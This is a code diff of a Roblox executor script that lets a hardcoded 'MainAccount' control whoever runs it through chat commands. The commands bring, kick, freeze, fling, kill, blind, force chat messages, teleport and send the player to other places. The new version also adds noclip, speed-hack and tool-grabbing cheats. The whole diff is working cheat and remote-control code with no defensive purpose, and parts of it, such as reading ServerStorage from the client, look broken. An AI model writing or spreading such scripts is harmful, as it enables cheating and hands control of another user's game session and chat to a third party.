@@ -1,42 +1,103 @@
 local MainAccount = "gferwtwe4atw4afa"
 
-game.Players[MainAccount].Chatted:Connect(function(msg)
-  local lowerMsg = msg:lower()
-  if lowerMsg == ".bring" then
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players[MainAccount].Character.HumanoidRootPart.Position) * CFrame.new(0, 2, 0)
-  elseif lowerMsg == ".kick" then
-    game.Players.LocalPlayer:Kick("TheFartMan Kicked You.")
-  elseif lowerMsg == ".freeze" then
-    game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
-    game.Players.LocalPlayer.Character.UpperTorso.Anchored = true
-  elseif lowerMsg == ".unfreeze" then
-    game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
-    game.Players.LocalPlayer.Character.UpperTorso.Anchored = false
-  elseif lowerMsg == ".test" then
-    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I'm Using Nebulon", "All")
-  elseif lowerMsg == ".blind" then
-    game.Workspace.Camera:Destroy()
-  elseif lowerMsg == ".fling" then
-    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 99999, 99999)
-  elseif lowerMsg == ".kill" then
-    game.Players.LocalPlayer.Character.Humanoid:ChangeState(15)
-    task.wait()
-    game.Players.LocalPlayer.Character.Humanoid:ChangeState(16)
-    task.wait()
-    game.Players.LocalPlayer.Character.Humanoid:ChangeState(0)
-  elseif lowerMsg == ".orbit" then
-    getgenv().orbit = true
-  elseif lowerMsg == ".unorbit" then
-    getgenv().orbit = false
-  elseif lowerMsg:sub(1, 4) == ".say" then
-    local sayMsg = msg:sub(6)  -- Extract the message after ".say "
-    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(sayMsg, "All")
-  end
-end)
+-- Ensure the MainAccount exists and is connected
+if game.Players:FindFirstChild(MainAccount) then
+    local mainPlayer = game.Players[MainAccount]
 
-game:GetService("RunService").Stepped:Connect(function()
-  if getgenv().orbit == true then
-    local CurrentTime = tick()
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players[MainAccount].Character.HumanoidRootPart.Position) * CFrame.Angles(0, 2 * math.pi * CurrentTime * 1 % (2 * math.pi), 0) * CFrame.new(0, 0, 10)
-  end
-end)
+    mainPlayer.Chatted:Connect(function(msg)
+        local lowerMsg = msg:lower()
+
+        if lowerMsg == ".bring" then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(mainPlayer.Character.HumanoidRootPart.Position) * CFrame.new(0, 2, 0)
+
+        elseif lowerMsg == ".kick" then
+            game.Players.LocalPlayer:Kick("TheFartMan Kicked You.")
+
+        elseif lowerMsg == ".freeze" then
+            game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
+            game.Players.LocalPlayer.Character.UpperTorso.Anchored = true
+
+        elseif lowerMsg == ".unfreeze" then
+            game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
+            game.Players.LocalPlayer.Character.UpperTorso.Anchored = false
+
+        elseif lowerMsg == ".test" then
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I'm Using Nebulon", "All")
+
+        elseif lowerMsg == ".blind" then
+            game.Workspace.CurrentCamera:Destroy()
+
+        elseif lowerMsg == ".fling" then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 99999, 99999)
+
+        elseif lowerMsg == ".kill" then
+            local humanoid = game.Players.LocalPlayer.Character.Humanoid
+            humanoid:ChangeState(Enum.HumanoidStateType.Dead)
+            task.wait()
+            humanoid:ChangeState(Enum.HumanoidStateType.Physics)
+            task.wait()
+            humanoid:ChangeState(Enum.HumanoidStateType.Running)
+
+        elseif lowerMsg == ".orbit" then
+            getgenv().orbit = true
+
+        elseif lowerMsg == ".unorbit" then
+            getgenv().orbit = false
+
+        elseif lowerMsg:sub(1, 4) == ".say" then
+            local sayMsg = msg:sub(6)  -- Extract the message after ".say "
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(sayMsg, "All")
+
+        elseif lowerMsg:sub(1, 9) == ".teleport" then
+            local targetPlayerName = lowerMsg:sub(11)
+            local targetPlayer = game.Players:FindFirstChild(targetPlayerName)
+            if targetPlayer and targetPlayer.Character then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+            end
+
+        elseif lowerMsg:sub(1, 5) == ".tool" then
+            local toolName = msg:sub(7)
+            local tool = game.ServerStorage:FindFirstChild(toolName)
+            if tool then
+                tool:Clone().Parent = game.Players.LocalPlayer.Backpack
+            end
+
+        elseif lowerMsg == ".speed" then
+            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 100
+
+        elseif lowerMsg == ".noclip" then
+            getgenv().noclip = true
+
+        elseif lowerMsg == ".unnoclip" then
+            getgenv().noclip = false
+            for _, part in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    part.CanCollide = true
+                end
+            end
+
+        elseif lowerMsg:sub(1, 5) == ".join" then
+            local placeId = tonumber(msg:sub(7))
+            if placeId then
+                game:GetService("TeleportService"):Teleport(placeId, game.Players.LocalPlayer)
+            end
+        end
+    end)
+
+    game:GetService("RunService").Stepped:Connect(function()
+        if getgenv().orbit then
+            local CurrentTime = tick()
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(mainPlayer.Character.HumanoidRootPart.Position) * CFrame.Angles(0, 2 * math.pi * CurrentTime % (2 * math.pi), 0) * CFrame.new(0, 0, 10)
+        end
+
+        if getgenv().noclip then
+            for _, part in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    part.CanCollide = false
+                end
+            end
+        end
+    end)
+else
+    warn("MainAccount not found!")
+end
